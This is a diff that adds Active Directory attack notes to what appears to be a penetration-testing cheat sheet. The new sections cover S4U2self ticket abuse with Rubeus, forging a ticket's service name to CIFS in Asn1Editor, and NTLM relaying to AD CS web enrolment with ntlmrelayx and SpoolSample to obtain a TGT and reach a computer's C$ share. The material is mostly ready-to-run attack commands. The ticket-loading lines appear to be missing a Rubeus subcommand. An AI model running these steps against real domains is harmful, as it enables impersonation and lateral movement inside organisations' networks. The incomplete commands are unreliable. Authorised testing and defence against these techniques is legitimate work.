@@ -1210,6 +1210,45 @@ req query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Conn
 - Inject a fake update directory to the WSUS server
   - https://github.com/AlsidOfficial/WSUSpendu 
 
+## S4U2self
+- Gain access to a domain computer if we have its RC4, AES256 or TGT.
+- There are means of obtaining a TGT for a computer without already having local admin access to it, such as pairing the Printer Bug and a machine with unconstrained delegation, NTLM relaying scenarios and Active Directory Certificate Service abuse
+
+#### Request TGS
+```
+.\Rubeus.exe s4u /user:<COMPUTERNAME>$ /msdsspn:cifs/<COMPUTER FQDN> /impersonateuser:<USER TO IMPERSONATE> /ticket:<TGT BASE64> /nowrap
+```
+
+- S4u2proxy will fail, the s4uself works. Copy the s4u2self base64 string
+
+#### Save it to disk
+```
+[System.IO.File]::WriteAllBytes("C:\Users\public\<USER>.kirbi", [System.Convert]::FromBase64String("<TICKET STRING>"))
+```
+
+#### Get information of the ticket
+```
+.\Rubeus.exe describe /ticket:C:\Users\public\<USER>.kirbi
+```
+
+- The Servicename is not valid for our use - we want it to be for CIFS.  This can be easily changed, because as we saw in the constrained delegation alternate service name demo, the service name is not in the encrypted part of the ticket and is not "checked".
+- Open it in ```Asn1Editor```.  Find the two instances where the GENERAL STRING <COMOTERNAME>$" appears.
+- Double-click them to open the Node Content Editor and replace these strings with "cifs".  We also need to add an additional string node with the FQDN of the machine. Right-click on the parent SEQUENCE and select New.  Enter 1b in the Tag field and click OK.  Double-click on the new node to edit the text.
+- First one should be CIFS, second one the FQDN of the machine.
+ 
+![afbeelding](https://user-images.githubusercontent.com/43987245/159697361-dab68723-e4d7-4966-9e6c-fad2f658457b.png)
+
+#### Load the ticket
+```
+.\Rubeus.exe /ticket:<TICKET BASE64>
+.\Rubeus.exe /ticket:<FILE TO KIRBI FILE>
+```
+ 
+#### Execute ls on the computer
+```
+ls \\<COMPOTERNAME FQDN>\C$
+```
+ 
 ## Active Directory Certificate Services
 - Whitepaper https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf
 - https://github.com/GhostPack/Certify
@@ -1250,6 +1289,22 @@ cat cert.pfx | base64 -w 0
 [System.IO.File]::WriteAllBytes("C:\Users\public\<USER>.kirbi", [System.Convert]::FromBase64String("<TICKET STRING>"))
 ```
 
+### Relaying to ADCS HTTP Endpoints
+- AD CS services support HTTP enrolment methods and even includes a GUI.  This endpoint is usually found at http[s]://<hostname>/certsrv, and by default supports NTLM and Negotiate authentication methods.
+
+#### Start ntlmrelayx.py
+```
+ntlmrelayx.py -t http://10.10.15.75/certsrv/certfnsh.asp -smb2support --adcs --no-http-server
+```
+ 
+#### Force authentication
+```
+.\SpoolSample.exe <IP> <IP>
+```
+ 
+#### Ouput should give a TGT which can be used with S4U2self
+- LINK TO S4U2self
+ 
 ## Cross Domain attacks
 ## Azure AD
 #### Enumerate where PHS AD connect is installed
